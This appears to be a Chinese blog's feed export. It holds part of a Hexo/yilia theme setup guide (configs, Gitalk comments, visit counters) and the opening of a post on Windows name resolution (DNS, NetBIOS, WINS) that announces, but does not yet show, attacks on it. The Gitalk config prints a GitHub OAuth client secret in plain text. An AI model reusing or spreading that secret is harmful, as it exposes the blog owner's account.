class="hljs-string">git@github.com:eW1z4rd/eW1z4rd.github.io.git</span><br>  <span class="hljs-attr">branch:</span> <span class="hljs-string">master</span><br></code></pre></td></tr></table></figure><h3 id="修改-yilia-配置文件"><a href="#修改-yilia-配置文件" class="headerlink" title="修改 yilia 配置文件"></a>修改 yilia 配置文件</h3><p>配置 yilia 文件夹下的 <code>_config.yml</code>（<code>hexo/themes/yilia/_config.yml</code>）：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># Header</span><br><span class="hljs-attr">menu:</span>  <span class="hljs-comment"># 主页左侧菜单</span><br>  <span class="hljs-string">主页:</span> <span class="hljs-string">/</span><br>  <span class="hljs-string">归档:</span> <span class="hljs-string">/archives</span><br><br><span class="hljs-comment"># SubNav</span><br><span class="hljs-attr">subnav:</span>  <span class="hljs-comment"># 子导航</span><br>  <span class="hljs-attr">github:</span> <span class="hljs-string">&quot;https://github.com/eW1z4rd/&quot;</span><br>  <span class="hljs-attr">mail:</span> <span class="hljs-string">&quot;mailto:chill_wizard@foxmail.com&quot;</span><br><br><span class="hljs-comment"># Content</span><br><span class="hljs-attr">excerpt_link:</span> <span class="hljs-string">阅读全文</span>  <span class="hljs-comment"># 文章截断按钮文字</span><br><span class="hljs-attr">show_all_link:</span> <span class="hljs-literal">false</span>  <span class="hljs-comment"># 文章卡片右下角常驻链接</span><br><br><span class="hljs-comment"># 目录</span><br><span class="hljs-attr">toc:</span> <span class="hljs-number">2</span>  <span class="hljs-comment"># 目录常显</span><br><span class="hljs-attr">toc_empty_wording:</span> <span class="hljs-string">&#x27;暂无目录…&#x27;</span>  <span class="hljs-comment"># 目录为空时的提示</span><br><br><span class="hljs-comment"># 是否有快速回到顶部的按钮</span><br><span class="hljs-attr">top:</span> <span class="hljs-literal">true</span>  <br><br><span class="hljs-comment"># Miscellaneous</span><br><span class="hljs-attr">baidu_analytics:</span> <span class="hljs-string">&#x27;f307e**********9239b6cfc3&#x27;</span>  <span class="hljs-comment"># 百度统计 API</span><br><span class="hljs-attr">favicon:</span> <span class="hljs-string">/img/favicon.ico</span>  <span class="hljs-comment"># ico 图标</span><br><br><span class="hljs-comment"># 作者头像</span><br><span class="hljs-attr">avatar:</span> <span class="hljs-string">/img/portrait.jpg</span>  <br><br><span class="hljs-comment"># 样式定制</span><br><span class="hljs-attr">style:</span><br>  <span class="hljs-attr">header:</span> <span class="hljs-string">&#x27;#4d4d4d&#x27;</span>  <span class="hljs-comment"># 头像上面的背景颜色</span><br>  <span class="hljs-attr">slider:</span> <span class="hljs-string">&#x27;linear-gradient(200deg,#ccc,#000)&#x27;</span>  <span class="hljs-comment"># 右滑板块背景</span><br><br><span class="hljs-comment"># 智能菜单</span><br><span class="hljs-attr">smart_menu:</span><br>  <span class="hljs-attr">innerArchive:</span> <span class="hljs-string">&#x27;所有文章&#x27;</span><br>  <span class="hljs-attr">friends:</span> <span class="hljs-literal">false</span><br>  <span class="hljs-attr">aboutme:</span> <span class="hljs-string">&#x27;关于我&#x27;</span><br><br><span class="hljs-comment"># 个人描述</span><br><span class="hljs-attr">aboutme:</span><br>  <span class="hljs-string">&lt;br&gt;</span><br>  <span class="hljs-string">evil</span> <span class="hljs-string">or</span> <span class="hljs-string">weakness</span><br>  <span class="hljs-string">&lt;br&gt;</span><br></code></pre></td></tr></table></figure><h3 id="配置缺失模块"><a href="#配置缺失模块" class="headerlink" title="配置缺失模块"></a>配置缺失模块</h3><ul><li>确保 node 版本大于 6.2</li><li>在根目录执行：<code>npm install hexo-generator-json-content --save</code></li><li>在根目录下的 <code>_config.yml</code>插入以下内容：</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">jsonContent:</span><br>    <span class="hljs-attr">meta:</span> <span class="hljs-literal">false</span><br>    <span class="hljs-attr">pages:</span> <span class="hljs-literal">false</span><br>    <span class="hljs-attr">posts:</span><br>      <span class="hljs-attr">title:</span> <span class="hljs-literal">true</span><br>      <span class="hljs-attr">date:</span> <span class="hljs-literal">true</span><br>      <span class="hljs-attr">path:</span> <span class="hljs-literal">true</span><br>      <span class="hljs-attr">text:</span> <span class="hljs-literal">false</span><br>      <span class="hljs-attr">raw:</span> <span class="hljs-literal">false</span><br>      <span class="hljs-attr">content:</span> <span class="hljs-literal">false</span><br>      <span class="hljs-attr">slug:</span> <span class="hljs-literal">false</span><br>      <span class="hljs-attr">updated:</span> <span class="hljs-literal">false</span><br>      <span class="hljs-attr">comments:</span> <span class="hljs-literal">false</span><br>      <span class="hljs-attr">link:</span> <span class="hljs-literal">false</span><br>      <span class="hljs-attr">permalink:</span> <span class="hljs-literal">false</span><br>      <span class="hljs-attr">excerpt:</span> <span class="hljs-literal">false</span><br>      <span class="hljs-attr">categories:</span> <span class="hljs-literal">false</span><br>      <span class="hljs-attr">tags:</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><h3 id="在-Hexo-中添加本地图片"><a href="#在-Hexo-中添加本地图片" class="headerlink" title="在 Hexo 中添加本地图片"></a>在 Hexo 中添加本地图片</h3><ul><li>把根目录下 <code>_config.yml</code> 中的 <code>post_asset_folder</code> 选项设置为 <strong>true</strong></li><li>在根目录下执行命令：<code>npm install hexo-asset-image --save</code></li><li>之后再运行 <code>hexo n &quot;xxxx&quot;</code> 新建博文时，<code>/source/_posts</code> 文件夹内除了 <code>xxxx.md</code> 文件还会有一个同名的文件夹，可以将想引入的图片先复制到这个文件夹中，在按照 markdown 的格式引入即可：<code>![img](xxxx/图片名.jpg)</code></li></ul><h3 id="修改代码块样式"><a href="#修改代码块样式" class="headerlink" title="修改代码块样式"></a>修改代码块样式</h3><p>原始的代码块的确不堪入目，我们可以改变配色，使它看起来舒服一些。</p><ul><li>直接修改编译好的文件（<code>theme/yilia/source/main.0cf68a.css</code>）：</li><li>修改代码块背景色，搜索 <code>.article-entry .highlight,</code>，修改background，<strong>推荐色值：#333333</strong></li><li>修改代码字体颜色，搜索 <code>.article-entry .highlight .line</code>，修改color，<strong>推荐色值：#f8f8ff</strong></li><li>修改行号颜色，搜索 <code>.article-entry .highlight .gutter pre .line</code>，修改color，<strong>推荐色值：#5686bf</strong></li></ul><h3 id="访问量的统计和显示"><a href="#访问量的统计和显示" class="headerlink" title="访问量的统计和显示"></a>访问量的统计和显示</h3><p>在 <code>themes/yilia/layout/_partial/after-footer.ejs</code> 中引入脚本：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 添加不蒜子统计</span><br>&lt;script <span class="hljs-keyword">async</span> src=<span class="hljs-string">&quot;https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;</span>&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure><ul><li><p>统计网站访问总量<br>修改 <code>themes/yilia/layout/_partial/footer.ejs</code>，添加本站总访问量和本站总访客数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"># PV 方式，单个用户连续点击 n 篇，记录 n 次访问值<br>&lt;span id=<span class="hljs-string">&quot;busuanzi_container_site_pv&quot;</span>&gt; Pageviews: <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;busuanzi_value_site_pv&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span> times &lt;/span&gt;              <br># UV 方式，单个用户连续点击 n 篇，记录 <span class="hljs-number">1</span> 次访问值<br>&lt;span <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;post-meta-divider&quot;</span>&gt;|&lt;/span&gt;<br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;busuanzi_container_site_uv&quot;</span>&gt;</span> Total Visitors: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;busuanzi_value_site_uv&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> persons <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br></code></pre></td></tr></table></figure></li><li><p>单篇文章点击量<br>在 <code>themes/yilia/layout/_partial/article.ejs</code> 的 <code>&lt;%- partial(&#39;post/title&#39;, &#123;class_name: &#39;article-title&#39;&#125;) %&gt;</code> 处插入代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;% <span class="hljs-keyword">if</span> (!index &amp;&amp; post.comments)&#123; %&gt;<br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cloud-tie-join-count&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:void(0);&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color:gray;font-size:14px;&quot;</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;icon-sort&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;busuanzi_container_page_pv&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color:gray;font-size:14px;&quot;</span>&gt;</span></span><br><span class="xml">阅读数：<span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;busuanzi_value_page_pv&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>次</span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br>&lt;% &#125; %&gt;<br></code></pre></td></tr></table></figure></li></ul><h3 id="百度统计配置"><a href="#百度统计配置" class="headerlink" title="百度统计配置"></a>百度统计配置</h3><ul><li>申请账号：<a href="https://tongji.baidu.com/">百度统计官网</a></li><li>在 yilia 文件夹下的 <code>_config.yml</code> 中找到 <code>baidu_analytics</code>，填入 key 即可。</li></ul><h3 id="设置网站-ico"><a href="#设置网站-ico" class="headerlink" title="设置网站 ico"></a>设置网站 ico</h3><ul><li>先到 <a href="https://www.xzlogo.com/">小智LOGO</a> 制作在线 logo</li><li>再到 <a href="http://www.bitbug.net/">比特虫</a> 用做好的 logo 生成 icon 图标（favicon.ico）</li><li>把 icon 图标放到 <code>themes/yilia/source/img</code> 文件夹下，再在 <code>yilia/_config.yml</code> 下引用 <code>favicon: /img/favicon.ico</code> 即可。</li></ul><h3 id="设置-404-页面"><a href="#设置-404-页面" class="headerlink" title="设置 404 页面"></a>设置 404 页面</h3><p>使用 <a href="https://www.qq.com/404/">腾讯公益404</a>，在根目录 <code>source</code> 文件夹下新建 <strong>404.html</strong> 文件，并添加以下代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>404<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;//qzonestyle.gtimg.cn/qzone/hybrid/app/404/search_children.js&quot;</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span> <span class="hljs-attr">homePageUrl</span>=<span class="hljs-string">&quot;https://ew1z4rd.github.io&quot;</span> <span class="hljs-attr">homePageName</span>=<span class="hljs-string">&quot;回到我的主页&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="添加评论系统"><a href="#添加评论系统" class="headerlink" title="添加评论系统"></a>添加评论系统</h3><ul><li>在 Github 中注册 GitHub Application，具体可参考 <a href="https://www.jianshu.com/p/656e6101bf0f">在个人博客里添加评论系统–Gitalk</a></li><li>在 <code>/theme/yilia/layout/_partial/post/</code> 目录下创建 <code>gitalk.ejs</code> 文件，并添加以下代码：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;div id=<span class="hljs-string">&quot;gitalk-container&quot;</span>&gt;&lt;/div&gt;<br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;gitalk-container&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;padding: 0px 30px 0px 30px;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css&quot;</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="xml"></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="javascript"><span class="xml"><span class="hljs-keyword">if</span>(&lt;%=theme.gitalk.enable%&gt;)&#123;</span></span><br><span class="javascript"><span class="xml">   <span class="hljs-keyword">var</span> gitalk = <span class="hljs-keyword">new</span> Gitalk(&#123;</span></span><br><span class="javascript"><span class="xml">   <span class="hljs-attr">clientID</span>: <span class="hljs-string">&#x27;&lt;%=theme.gitalk.ClientID%&gt;&#x27;</span>,</span></span><br><span class="javascript"><span class="xml">   <span class="hljs-attr">clientSecret</span>: <span class="hljs-string">&#x27;&lt;%=theme.gitalk.ClientSecret%&gt;&#x27;</span>,</span></span><br><span class="javascript"><span class="xml">   <span class="hljs-attr">repo</span>: <span class="hljs-string">&#x27;&lt;%=theme.gitalk.repo%&gt;&#x27;</span>,</span></span><br><span class="javascript"><span class="xml">   <span class="hljs-attr">owner</span>: <span class="hljs-string">&#x27;&lt;%=theme.gitalk.githubID%&gt;&#x27;</span>,</span></span><br><span class="javascript"><span class="xml">   <span class="hljs-attr">admin</span>: [<span class="hljs-string">&#x27;&lt;%=theme.gitalk.adminUser%&gt;&#x27;</span>],</span></span><br><span class="javascript"><span class="xml">   <span class="hljs-attr">id</span>: md5(<span class="hljs-built_in">window</span>.location.pathname),</span></span><br><span class="javascript"><span class="xml">   <span class="hljs-attr">distractionFreeMode</span>: <span class="hljs-string">&#x27;&lt;%=theme.gitalk.distractionFreeMode%&gt;&#x27;</span></span></span><br><span class="javascript"><span class="xml">&#125;)</span></span><br><span class="javascript"><span class="xml">gitalk.render(<span class="hljs-string">&#x27;gitalk-container&#x27;</span>)</span></span><br><span class="javascript"><span class="xml">&#125;</span></span><br><span class="javascript"><span class="xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><ul><li>在 <code>/theme/yilia/layout/_partial/article.ejs</code> 文件中最后一行 <code>&lt;% &#125; %&gt;</code> 之前添加以下内容：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;% <span class="hljs-keyword">if</span>(theme.gitalk.enable &amp;&amp; theme.gitalk.distractionFreeMode)&#123; %&gt;<br>&lt;%- partial(<span class="hljs-string">&#x27;gitalk&#x27;</span>, &#123;<br>    <span class="hljs-attr">key</span>: post.slug,<br>  <span class="hljs-attr">title</span>: post.title,<br>    <span class="hljs-attr">url</span>: config.url+url_for(post.path)<br>&#125;) %&gt;<br>&lt;% &#125; %&gt;<br></code></pre></td></tr></table></figure><ul><li>在 yilia 的配置文件 <code>_config.yml</code> 中 gitment 下面添加以下配置文件：</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># Gitalk</span><br><span class="hljs-attr">gitalk:</span> <br>  <span class="hljs-attr">enable:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">clientID:</span> <span class="hljs-string">&#x27;690107f290505440a443&#x27;</span>  <span class="hljs-comment">#  Github 生成</span><br>  <span class="hljs-attr">clientSecret:</span> <span class="hljs-string">&#x27;a05e41d3ce002564284f3615e37fec2ea2b0cd51&#x27;</span>  <span class="hljs-comment">#  Github 生成</span><br>  <span class="hljs-attr">repo:</span> <span class="hljs-string">&#x27;ew1z4rd.github.io&#x27;</span>  <span class="hljs-comment"># 用户名.github.io</span><br>  <span class="hljs-attr">owner:</span> <span class="hljs-string">&#x27;ew1z4rd&#x27;</span>  <span class="hljs-comment"># 用户名</span><br>  <span class="hljs-attr">admin:</span> <span class="hljs-string">&#x27;ew1z4rd&#x27;</span>  <span class="hljs-comment"># 用户名</span><br>  <span class="hljs-attr">distractionFreeMode:</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><h3 id="关于-litten-me-9005"><a href="#关于-litten-me-9005" class="headerlink" title="关于 litten.me:9005"></a>关于 litten.me:9005</h3><p>主题作者为了更好地完善这个主题，有时会收集用户的客户端信息，目前作者关闭了服务器，这个脚本会导致博客持续加载，解决方法是将 <code>themes/yilia/source/main.0cf68a.js</code> 里面的 <code>//litten.me:9005/badjs/</code> 注释掉，详情见：<a href="https://github.com/litten/hexo-theme-yilia/issues/580">https://github.com/litten/hexo-theme-yilia/issues/580</a></p><h2 id="Hexo-使用"><a href="#Hexo-使用" class="headerlink" title="Hexo 使用"></a>Hexo 使用</h2><h3 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h3><p>tag 对应的是文章的标签，在需要标识多个标签时，使用如下语法：<code>tags: [tag1, tag2, tag3]</code></p><h3 id="截断"><a href="#截断" class="headerlink" title="截断"></a>截断</h3><p>如果不使用文章截断，会默认在主页显示整篇文章，可以在 md 文件中需要做截断的地方使用 <code>&lt;!--more--&gt;</code> 标记。</p><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">hexo new &quot;postName&quot;  # 新建文章<br>hexo new page &quot;pageName&quot;  # 新建页面<br>hexo clean  # 清除缓存文件和静态文件（public）<br>hexo generate  # 生成静态页面至 public 目录<br>hexo server  # 在本地服务器运行<br>hexo deploy  # 将.deploy_git 目录部署到 GitHub<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 简写：</span><br>hexo n == hexo new<br>hexo g == hexo generate<br>hexo s == hexo server<br>hexo d == hexo deploy<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 常用复合命令：</span><br>hexo d -g<br>hexo s -g<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>其他</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hexo</tag>
      
      <tag>yilia</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows 名称解析机制探究及缺陷利用</title>
    <link href="/post/Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E6%9C%BA%E5%88%B6%E6%8E%A2%E7%A9%B6%E5%8F%8A%E7%BC%BA%E9%99%B7%E5%88%A9%E7%94%A8/"/>
    <url>/post/Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E6%9C%BA%E5%88%B6%E6%8E%A2%E7%A9%B6%E5%8F%8A%E7%BC%BA%E9%99%B7%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>本文阐述了 Windows 系统中的名称解析机制，同时也提及了几种利用名称解析机制的缺陷进行内网攻击的方式。</p><h2 id="0x00-Windows-名称解析简介"><a href="#0x00-Windows-名称解析简介" class="headerlink" title="0x00 Windows 名称解析简介"></a>0x00 Windows 名称解析简介</h2><p>TCP 协议的通信是基于 IP 地址的，“名称解析” 就是把需要访问的计算机的名字解析为 IP 地址的过程。</p><p><strong>Windows 中的名称类型</strong></p><p>在 Windows 操作系统中有两种名称，分别为：<strong>主机名称</strong> 和 <strong>NetBIOS 名称</strong>。</p><p><strong>主机名称</strong></p><p>从狭义上来说，主机名称正如它的字面意思一样就是一台主机的名字；从广义来说，它又不仅仅包含计算机的名字，也包含互联网中的域名。</p><p>由于域名是以树状的形式所表现的，同时也是主机名称的一种，所以主机名称是有层次的，最大长度为 255 个字符，允许的字符有 <code>A～Z</code>，<code>a～z</code> 和 <code>-</code>。在域名系统中有一种标识一台主机的 DNS 名字的域名叫做 <strong>FQDN（Fully Qualified Domain Name，全限定域名）</strong>，从全限定域名中包含的信息可以准确看出主机在域名树中的位置。</p><blockquote><p>FQDN 是一种同时带有主机名和域名的名称，含义是完整的域名。<code>FQDN = Hostname + DomainName</code>。例如，主机名是 test，域名是 example.com，则该主机的 FQDN = test.example.com。</p></blockquote><p><strong>NetBIOS 名称</strong></p><p>在 Windows 系统中使用的另外一种名称就是 NetBIOS 名称，准确的说 NetBIOS 名称并非是一种名字系统，而是 Windows 操作系统网络的一个编程接口，允许主机之间使用 NetBIOS 名称进行通信，通信过程是建立在 NetBIOS 协议之上的。在安装完 Windows 系统后系统会默认使用计算机的名字做为当前主机的 NetBIOS 名称。它的最大长度为 16 个字符，其中最后一位是不可配置的，用于指定 NetBIOS 的服务类型。如果计算机名称不足 15 位则使用空格补全到 15 位，反之，如果计算机名称超过 15 位则会截取前 15 位。常见的 NetBIOS 后缀有 0x20（文件和打印服务）、0x00（工作站服务）、0x03（报信者服务） 等。</p><blockquote><p> 使用 nbtstat -n 命令查看本机的 NetBIOS 名称。<br>使用 nbtstat -A ipaddress 命令查看指定 IP 主机的 NetBIOS 名称。</p></blockquote><h2 id="0x01-Windows-名称解析相关协议"><a href="#0x01-Windows-名称解析相关协议" class="headerlink" title="0x01 Windows 名称解析相关协议"></a>0x01 Windows 名称解析相关协议</h2><p>在 Windows 系统中有三种与名称解析相关的协议。</p><h3 id="DNS-协议"><a href="#DNS-协议" class="headerlink" title="DNS 协议"></a>DNS 协议</h3><p>DNS 协议是一种最主要的也是操作系统首选的进行名称解析的协议，几乎每一种操作系统都支持 DNS 协议，同时， DNS 协议支持 IPv4 和 IPv6。DNS 协议在实现名称解析的过程中，在客户机上没有任何本地的数据库文件，完全依赖于 DNS 服务器，所监听的端口是 UDP/53 。</p><blockquote><p>使用 ipconfig /displaydns 命令来查看本机的 DNS 缓存。<br>使用 ipconfig /flushdns 命令清除本机的 DNS 缓存。</p></blockquote><p>DNS 的名称解析过程如下：</p><ul><li>读取本机 DNS 缓存（包含本机 hosts 文件）；</li><li>如果缓存中没有，则会请求网络配置中配置的 DNS 服务器；</li><li>如果 DNS 服务器未作出响应，则请求失败；反之，DNS 服务器会处理用户请求。</li></ul><blockquote><p>hosts 文件位于 C:\Windows\System32\drivers\etc\hosts，用于提供主机名到 IP 地址的解析 。</p></blockquote><h3 id="NetBIOS-协议"><a href="#NetBIOS-协议" class="headerlink" title="NetBIOS 协议"></a>NetBIOS 协议</h3><p>除了 DNS 之外，在早先版本的 Windows 中也使用 <strong>NetBIOS（Network Basic Input/Output System，网络基本输入输出系统）</strong>进行名称解析。本文介绍的 NetBIOS 协议名称解析是微软后来定义的 <strong>NBT（ NetBIOS over TCP/IP）</strong>的名称解析类型。</p><p>NBT 服务监听的端口为 UDP/137，其进行名称解析的形式为向当前主机所在的子网域发送广播包。所以，当你使用抓包工具在局域网中抓包时总会收到很多 <strong>NBNS 数据包</strong>。</p><blockquote><p>NBNS（NetBIOS Name Service，NetBIOS 域名服务器），类似于 TCP/IP 协议中的 DNS，它负责查找目标机器相应的节点地址（TCP/IP协议中为IP地址），并赋予一个 NetBIOS 名称。</p></blockquote><p>由于 NetBIOS 协议进行名称解析是发送的 <strong>UDP 广播包</strong>，这样做虽然速度快且无需额外的配置，但是广播包不能跨越网域同时也会增加一些网络流量，因此微软在后来推出了 <strong>WINS（Windows Internet Name Service，Windows 网络名称服务）</strong>服务器，当计算机配置为使用 WINS 服务器进行名称解析时，客户机将直接和 WINS 服务器进行 <strong>单播</strong> 通讯，这样就可以弥补 NetBIOS 协议使用广播进行名称解析的不足。</p><p>综上所述，NetBIOS 协议进行名称解析的过程如下：</p><ul><li>检查本地 NetBIOS 缓存；</li><li>如果缓存中没有请求的名称且已配置了 WINS 服务器，接下来则会向 WINS 服务器发出请求；</li><li>如果没有配置 WINS 服务器或 WINS 服务器无响应则会向当前子网域发送广播；</li><li>如果发送广播后无任何主机响应则会读取本地的 lmhosts 文件。</li></ul><blockquote><p>lmhosts 文件位于 C:\Windows\System32\drivers\etc\lmhosts.sam，用于把 NetBIOS 名字映射到IP地址。</p><p>使用 nbtstat -c 命令查看本机的 